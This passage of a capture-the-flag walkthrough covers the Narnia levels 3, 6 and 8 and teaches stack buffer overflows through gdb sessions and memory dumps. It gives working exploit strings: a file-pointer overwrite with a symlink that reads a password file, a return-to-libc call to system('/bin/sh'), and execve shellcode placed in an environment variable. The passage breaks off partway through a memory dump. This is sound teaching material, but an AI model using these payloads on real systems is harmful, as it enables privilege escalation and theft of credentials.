<p>We can use this program to read the contents of /etc/narnia_pass/narnia4, but the output is written to /dev/null. We control the input file and the output file is set as /dev/null. However, because of the way the stack is laid out, we can write past the ifile buffer and overwrite the value of ofile. This lets us replace /dev/null with another file of our choosing. Here’s what the stack looks like:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">+---------+</span>
<span class="o">|</span>  <span class="n">ret</span>    <span class="o">|</span>
<span class="o">|</span>  <span class="n">sfp</span>    <span class="o">|</span>
<span class="o">|</span>  <span class="n">ofd</span>    <span class="o">|</span>
<span class="o">|</span>  <span class="n">ifd</span>    <span class="o">|</span>
<span class="o">|</span>  <span class="n">ofile</span>  <span class="o">|</span>
<span class="o">|</span>  <span class="n">ifile</span>  <span class="o">|</span>
<span class="o">|</span>  <span class="n">buf</span>    <span class="o">|</span>
<span class="o">+---------+</span> <span class="o">&lt;-</span> <span class="n">esp</span>
</pre></div>
</div>
<p>ifile and ofile are 32-byte arrays. We can compile the program with -ggdb and examine it in gdb</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1"># gcc -ggdb -m32 -fno-stack-protector -Wl,-z,norelro narnia3.c -o narnia3</span>
<span class="c1"># gdb -q narnia3</span>
</pre></div>
</div>
<p>If we disas main, we can see that strcpy is called at *main+100:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>0x08048551 &lt;+93&gt;:    lea    0x38(%esp),%eax
0x08048555 &lt;+97&gt;:    mov    %eax,(%esp)
0x08048558 &lt;+100&gt;:   call   0x8048400 &lt;strcpy@plt&gt;
0x0804855d &lt;+105&gt;:   movl   $0x2,0x4(%esp)
0x08048565 &lt;+113&gt;:   lea    0x58(%esp),%eax
0x08048569 &lt;+117&gt;:   mov    %eax,(%esp)
</pre></div>
</div>
<p>We set a breakpoint there and run the program with the following arguments:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>(gdb) r `python -c &#39;print &quot;A&quot;*32 + &quot;/tmp/hack&quot;&#39;`
Starting program: /root/wargames/narnia/3/narnia3 `python -c &#39;print &quot;A&quot;*32 + &quot;/tmp/hack&quot;&#39;`

Breakpoint 1, 0x08048558 in main (argc=2, argv=0xbffff954) at narnia3.c:37
37          strcpy(ifile, argv[1]);
</pre></div>
</div>
<p>At the first breakpoint, we examine the local variables</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="nb">locals</span>
<span class="n">ifd</span> <span class="o">=</span> <span class="mi">134514299</span>
<span class="n">ofd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1208180748</span>
<span class="n">ofile</span> <span class="o">=</span> <span class="s2">&quot;/dev/null</span><span class="se">\000\000\000\000\000\000</span><span class="s2">&quot;</span>
<span class="n">ifile</span> <span class="o">=</span> <span class="s2">&quot;x</span><span class="se">\370\377\277\234\203\004\b\200\020\377\267\214\230\004\b\250\370\377\277\211\206\004\b</span><span class="s2">$</span><span class="se">\243\374\267\364\237</span><span class="s2">&quot;</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">incomplete</span> <span class="n">sequence</span> \<span class="mi">374</span>\<span class="mi">267</span><span class="o">&gt;</span>
<span class="n">buf</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\370\370\377\267\364\237\374\267\371\234\367\267\245</span><span class="s2">B</span><span class="se">\352\267</span><span class="s2">h</span><span class="se">\370\377\277</span><span class="s2">չ</span><span class="se">\350\267\364\237\374\267\214\230\004\b</span><span class="s2">&quot;</span>
</pre></div>
</div>
<p>ofile is set to /dev/null as expected. We’ll step to the next instruction and check again.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span> <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">s</span>
 <span class="mi">38</span>          <span class="k">if</span><span class="p">((</span><span class="n">ofd</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">ofile</span><span class="p">,</span><span class="n">O_RDWR</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">){</span>
 <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="nb">locals</span>
 <span class="n">ifd</span> <span class="o">=</span> <span class="mi">134514299</span>
 <span class="n">ofd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1208180748</span>
 <span class="n">ofile</span> <span class="o">=</span> <span class="s2">&quot;/tmp/hack</span><span class="se">\000\000\000\000\000\000</span><span class="s2">&quot;</span>
 <span class="n">ifile</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">32</span> <span class="n">times</span><span class="o">&gt;</span>
 <span class="n">buf</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\370\370\377\267\364\237\374\267\371\234\367\267\245</span><span class="s2">B</span><span class="se">\352\267</span><span class="s2">h</span><span class="se">\370\377\277</span><span class="s2">չ</span><span class="se">\350\267\364\237\374\267\214\230\004\b</span><span class="s2">&quot;</span>

<span class="n">As</span> <span class="n">expected</span><span class="p">,</span> <span class="n">ofile</span> <span class="n">has</span> <span class="n">been</span> <span class="n">overwritten</span> <span class="n">to</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">hack</span><span class="o">.</span> <span class="n">However</span> <span class="n">ifile</span> <span class="ow">is</span> <span class="n">now</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">hack</span> <span class="n">so</span> <span class="ow">in</span> <span class="n">order</span> <span class="n">to</span> <span class="n">read</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">narnia_pass</span><span class="o">/</span><span class="n">narnia4</span><span class="p">,</span> <span class="n">we</span> <span class="n">need</span> <span class="n">to</span> <span class="n">create</span> <span class="n">a</span> <span class="n">directory</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="o">/</span><span class="n">tmp</span> <span class="ow">and</span> <span class="n">symlink</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">narnia_pass</span><span class="o">/</span><span class="n">narnia4</span> <span class="n">to</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">hack</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>narnia3@melissa:/tmp/skojiman3$ mkdir -p AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp
narnia3@melissa:/tmp/skojiman3$ ln -s /etc/narnia_pass/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack
</pre></div>
</div>
<p>Next we need to create the output file /tmp/hack that ofile points to</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>narnia3@melissa:/tmp/skojiman3$ touch /tmp/hack
narnia3@melissa:/tmp/skojiman3$ chmod 666 /tmp/hack
narnia3@melissa:/tmp/skojiman3$ ls -l /tmp/hack
-rw-rw-rw- 1 narnia3 narnia3 0 2012-11-24 22:58 /tmp/hack
</pre></div>
</div>
<p>Finally, execute /narnia/narnia3 as follows:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>narnia3@melissa:/tmp/skojiman3$ /narnia/narnia3 `python -c &#39;print &quot;A&quot;*32 + &quot;/tmp/hack&quot;&#39;`
copied contents of AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack to a safer place... (/tmp/hack)
narnia3@melissa:/tmp/skojiman3$ cat /tmp/hack
thaenohtai
��*������e���@�narnia3@melissa:/tmp/skojiman3$
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Let’s see another example Narnia6.</p></li>
</ul>
<blockquote>
<div><div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>

<span class="k">extern</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">environ</span><span class="p">;</span>

<span class="c1">// tired of fixing values...</span>
<span class="c1">// - morla</span>
<span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="nf">get_sp</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">       </span><span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;movl %esp,%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
<span class="w">               </span><span class="s">&quot;and $0xff000000, %eax&quot;</span>
<span class="w">               </span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">b1</span><span class="p">[</span><span class="mi">8</span><span class="p">],</span><span class="w"> </span><span class="n">b2</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
<span class="w">    </span><span class="kt">int</span><span class="w">  </span><span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">))</span><span class="o">&amp;</span><span class="n">puts</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">!=</span><span class="mi">3</span><span class="p">){</span><span class="w"> </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s b1 b2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="w"> </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>

<span class="w">    </span><span class="cm">/* clear environ */</span>
<span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
<span class="w">        </span><span class="n">memset</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
<span class="w">    </span><span class="cm">/* clear argz    */</span>
<span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">3</span><span class="p">;</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
<span class="w">        </span><span class="n">memset</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>

<span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">b1</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">b2</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
<span class="w">    </span><span class="c1">//if(((unsigned long)fp &amp; 0xff000000) == 0xff000000)</span>
<span class="w">    </span><span class="k">if</span><span class="p">(((</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="n">fp</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xff000000</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">get_sp</span><span class="p">())</span>
<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
<span class="w">    </span><span class="n">fp</span><span class="p">(</span><span class="n">b1</span><span class="p">);</span>

<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>
<p>Stack is not executable for this binary. This binary is an example of “return-to-libc” attack is a computer security attack usually starting with a buffer overflow in which a subroutine return address on a call stack is replaced by an address of a subroutine that is already present in the process’ executable memory, rendering the NX bit feature useless (if present) and ridding the attacker of the need to inject their own code.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>gdb -q narnia6
Reading symbols from /home/bitvijays/narnia6...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
gdb-peda$
</pre></div>
</div>
<p>Let’s compile the source on the local and check what happens:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">gcc</span> <span class="o">-</span><span class="n">m32</span> <span class="o">-</span><span class="n">ggdb</span> <span class="o">-</span><span class="n">fno</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">protector</span> <span class="o">-</span><span class="n">Wall</span> <span class="n">narnia6</span><span class="o">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">narnia61</span>
</pre></div>
</div>
<p>If you see carefully, we passed A<em>8 + BBBB + “ “ + “C”</em>8 + DDDD, which resulted in</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>gdb -q ./narnia61
gdb-peda$ pdisass main
Dump of assembler code for function main:
   0x080486d2 &lt;+330&gt;:   call   0x8048450 &lt;exit@plt&gt;
   0x080486d7 &lt;+335&gt;:   lea    eax,[esp+0x20]
   0x080486db &lt;+339&gt;:   mov    DWORD PTR [esp],eax
   0x080486de &lt;+342&gt;:   mov    eax,DWORD PTR [esp+0x28]
   0x080486e2 &lt;+346&gt;:   call   eax
   0x080486e4 &lt;+348&gt;:   mov    DWORD PTR [esp],0x1
   0x080486eb &lt;+355&gt;:   call   0x8048450 &lt;exit@plt&gt;
End of assembler dump.
gdb-peda$ br *main+346
Breakpoint 1 at 0x80486e2: file narnia6.c, line 48.
gdb-peda$ run `python -c &#39;print &quot;A&quot;*8 + &quot;BBBB&quot; + &quot; &quot; + &quot;C&quot;*8 + &quot;DDDD&quot;&#39;`
[-------------------------------------code-------------------------------------]
   0x80486d7 &lt;main+335&gt;:    lea    eax,[esp+0x20]
   0x80486db &lt;main+339&gt;:    mov    DWORD PTR [esp],eax
   0x80486de &lt;main+342&gt;:    mov    eax,DWORD PTR [esp+0x28]
=&gt; 0x80486e2 &lt;main+346&gt;:    call   eax
   0x80486e4 &lt;main+348&gt;:    mov    DWORD PTR [esp],0x1
   0x80486eb &lt;main+355&gt;:    call   0x8048450 &lt;exit@plt&gt;
   0x80486f0 &lt;__libc_csu_fini&gt;: push   ebp
   0x80486f1 &lt;__libc_csu_fini+1&gt;:   mov    ebp,esp
Guessed arguments:
arg[0]: 0xffffd380 (&quot;DDDD&quot;)
Breakpoint 1, 0x080486e2 in main (argc=0x3, argv=0xffffd444) at narnia6.c:48
48      fp(b1);
gdb-peda$ p b1
$1 = &quot;DDDD\000AAA&quot;
gdb-peda$ p b2
$2 = &quot;CCCCCCCC&quot;
gdb-peda$ p puts
$3 = {&lt;text variable, no debug info&gt;} 0xf7eb3360 &lt;puts&gt;
gdb-peda$ p system
$4 = {&lt;text variable, no debug info&gt;} 0xf7e8bc30 &lt;system&gt;
gdb-peda$ p &amp;b1
$5 = (char (*)[8]) 0xffffd380
gdb-peda$ x/50xw 0xffffd350
0xffffd360: 0xffffd380  0xffffd5df  0x0000003b  0x0804874b
0xffffd370: 0x00000003  0xffffd444  0x43434343  0x43434343
0xffffd380: 0x44444444  0x41414100  0x42424242  0x00000000
0xffffd390: 0x08048700  0xf7fb0ff4  0xffffd418  0xf7e66e46
0xffffd3a0: 0x00000003  0xffffd444  0xffffd454  0xf7fde860
gdb-peda$ p fp
$6 = (int (*)(char *)) 0x42424242
gdb-peda$ p &amp;fp
$7 = (int (**)(char *)) 0xffffd388
gdb-peda$ p $fp
$8 = (void *) 0xffffd398
</pre></div>
</div>
<p>The address of fp “p &amp;fp” is 0xffffd3888 which has a value of (“p fp”) 0x42424242. As previously the stack is NoteXecutable, but stdlib.h is included in the C Program. Stdlib.h includes system call which has an address of (“p system”) 0xf7e8bc30. Further DDDD overwrites AAAA with the Null byte.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>narnia6@melinda:/narnia$ ./narnia6 `python -c &#39;print &quot;A&quot;*8 + &quot;\x40\x1c\xe6\xf7&quot; + &quot; &quot; + &quot;C&quot;*8 + &quot;/bin/sh&quot;&#39;`
$ cat /etc/narnia_pass/narnia7
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Let’s see another example where we have to use a environment variable to invoke a shell Narnia8.</p></li>
</ul>
<blockquote>
<div><div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
<span class="c1">// gcc&#39;s variable reordering fucked things up</span>
<span class="c1">// to keep the level in its old style i am</span>
<span class="c1">// making &quot;i&quot; global unti i find a fix</span>
<span class="c1">// -morla</span>
<span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">func</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">b</span><span class="p">){</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">blah</span><span class="o">=</span><span class="n">b</span><span class="p">;</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">bok</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
<span class="w">    </span><span class="c1">//int i=0;</span>

<span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">bok</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">bok</span><span class="p">));</span>
<span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">blah</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
<span class="w">        </span><span class="n">bok</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">blah</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">bok</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">){</span>

<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span>
<span class="w">        </span><span class="n">func</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="w">    </span><span class="k">else</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>Let’s see what is happening here: for loop in function func copies data from blah to bok character array until a null character is found. Let’s see how the stack would look like</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">bok</span> <span class="n">character</span> <span class="n">array</span><span class="o">&gt;&lt;</span><span class="n">blah</span> <span class="n">pointer</span><span class="o">&gt;&lt;</span><span class="n">fp</span><span class="o">&gt;&lt;</span><span class="n">ret</span><span class="o">&gt;&lt;</span><span class="n">pointer</span> <span class="n">b</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>Let’s confirm this by using gdb? We put an breakpoint on printf function in the func function.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mh">0xffffd670</span><span class="p">:</span> <span class="mh">0x08048580</span>  <span class="mh">0xffffd688</span>  <span class="mh">0x00000014</span>  <span class="mh">0xf7e54f53</span>
<span class="mh">0xffffd680</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00ca0000</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd690</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x00414141</span>  <span class="mh">0xffffd8b1</span>
<span class="mh">0xffffd6a0</span><span class="p">:</span> <span class="mh">0x00000002</span>  <span class="mh">0xffffd764</span>  <span class="mh">0xffffd6c8</span>  <span class="mh">0x080484cd</span>
<span class="mh">0xffffd6b0</span><span class="p">:</span> <span class="mh">0xffffd8b1</span>  <span class="mh">0xf7ffd000</span>  <span class="mh">0x080484fb</span>  <span class="mh">0xf7fca000</span>
</pre></div>
</div>
<p>Address 0xffffd689 marks the start of the character buffer bok. I entered 19 A so it’s 0x41 19 times followed by null 0x00. Followed by that is 0xffffd8b1 (Value of Blah pointer). Followed by fp 12 bytes &lt;0x00000002 0xffffd764 0xffffd6c8&gt;. Followed by 0x080484cd which is the return address</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x080484cd</span>
<span class="mh">0x80484cd</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">31</span><span class="o">&gt;</span><span class="p">:</span>    <span class="s2">&quot;</span><span class="se">\353\025\213</span><span class="s2">E</span><span class="se">\f\213</span><span class="s2">&quot;</span>
</pre></div>
</div>
<p>followed by pointer b (0xffffd8b1). Let’s see what’s at location 0xffffd8b1</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">wx</span> <span class="mh">0xffffd8b1</span>
<span class="mh">0xffffd8b1</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd8c1</span><span class="p">:</span> <span class="mh">0x00414141</span>  <span class="mh">0x5f474458</span>  <span class="mh">0x53534553</span>  <span class="mh">0x5f4e4f49</span>
</pre></div>
</div>
<p>Let’s see what happens when we try to enter more than the 19 character (buffer size of bok - 1 byte (for null character))</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>narnia8@melinda:/narnia$ ./narnia8 `python -c &#39;print &quot;A&quot;*20&#39;`
AAAAAAAAAAAAAAAAAAAA����
narnia8@melinda:/narnia$ ./narnia8 `python -c &#39;print &quot;A&quot;*20&#39;` | hexdump
0000000 4141 4141 4141 4141 4141 4141 4141 4141
0000010 4141 4141 d8bf ffff 0a02
000001a
</pre></div>
</div>
<p>As expected, we get A followed by some garbage. which is the address where blah is pointing. We know that we can overwrite the RET address by</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1"># `python -c &#39;print &quot;A&quot;*20 + &quot;\x90\x90\x90\x90&quot; + &quot;A&quot;*12 + &quot;BBBB&quot;&#39;`</span>
</pre></div>
</div>
<p>Let’s see what happens when we do this. After copying 20 A it copies x90 and makes blah pointer from 0xffffd8bf to 0xffffd890. Because of the for loop</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">blah</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</pre></div>
</div>
<p>It now copies the character from 0xffffd890 reference i.e 0xffffd890 + i value. Suppose it copied the character 0x41. The address becomes 0xffff4190 and now for loop searches from that address until a null character is found.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>(gdb) x/20xw $esp
0xffffd660: 0xffffd678  0x00000000  0x00000014  0xf7e54f53
0xffffd670: 0x00000000  0x00ca0000  0x41414141  0x41414141
0xffffd680: 0x41414141  0x41414141  0x41414141  0xffffd890
0xffffd690: 0x00000002  0xffffd754  0xffffd6b8  0x080484cd
0xffffd6a0: 0xffffd89c  0xf7ffd000  0x080484fb  0xf7fca000

(gdb) x/10xw 0xffffd890
0xffffd890: 0x2f61696e  0x6e72616e  0x00386169  0x41414141
0xffffd8a0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd8b0: 0x90909090  0x41414141

(gdb) x/20xw $esp
0xffffd660: 0x08048580  0xffffd678  0x00000014  0xf7e54f53
0xffffd670: 0x00000000  0x00ca0000  0x41414141  0x41414141
0xffffd680: 0x41414141  0x41414141  0x41414141  0xffff4190
0xffffd690: 0x00000002  0xffffd754  0xffffd6b8  0x080484cd
0xffffd6a0: 0xffffd89c  0xf7ffd000  0x080484fb  0xf7fca000

(gdb) x/10xw 0xffff4190
0xffff4190: 0x00000000  0x00000000  0x00000000  0x00000000
0xffff41a0: 0x00000000  0x00000000  0x00000000  0x00000000
0xffff41b0: 0x00000000  0x00000000
</pre></div>
</div>
<p>If we can somehow keep/change the blah pointer back to it’s original value we may overwrite the RET pointer (after 12 bytes). Let’s see how 0xffffd89c looks when is used</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>`python -c &#39;print &quot;A&quot;*20 + &quot;\x90\x90\x90\x90&quot; + &quot;A&quot;*12 + &quot;BBBB&quot;&#39;`
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">30</span><span class="n">xw</span> <span class="mh">0xffffd89c</span>
<span class="mh">0xffffd89c</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd8ac</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x90909090</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
<span class="mh">0xffffd8bc</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x42424242</span>  <span class="mh">0x47445800</span>  <span class="mh">0x5345535f</span>
</pre></div>
</div>
<p>When we used the below with the address, we were able to overwrite the RET by BBBB. Now, we control the EIP :)</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>(gdb) run `python -c &#39;print &quot;A&quot;*20 + &quot;\x9c\xd8\xff\xff&quot; + &quot;A&quot;*12 + &quot;BBBB&quot;&#39;`


(gdb) x/20xw $esp
0xffffd660: 0x08048580  0xffffd678  0x00000014  0xf7e54f53
0xffffd670: 0x00000000  0x00ca0000  0x41414141  0x41414141
0xffffd680: 0x41414141  0x41414141  0x41414141  0xffffd89c
0xffffd690: 0x41414141  0x41414141  0x41414141  0x42424242
</pre></div>
</div>
<p>Let’s export a shellcode using a environment variable check it’s address on the stack and redirect the flow of our code to it. Notice the number of NOPs we have put for easy identification plus reachability.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>export EGG=`python -c &#39;print &quot;\x90&quot;*90 + &quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;&#39;`
</pre></div>
</div>
<p>Searching our environment variable we get it at address 0xffffd8d4.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>(gdb) x/100xw $esp+500
0xffffd7e4: 0x0000000f  0xffffd80b  0x00000000  0x00000000
0xffffd7f4: 0x00000000  0xde000000  0x1a2a5992  0xf11444ea
0xffffd804: 0x11433cf3  0x694a71a2  0x00363836  0x672f0000
0xffffd814: 0x73656d61  0x72616e2f  0x2f61696e  0x6e72616e
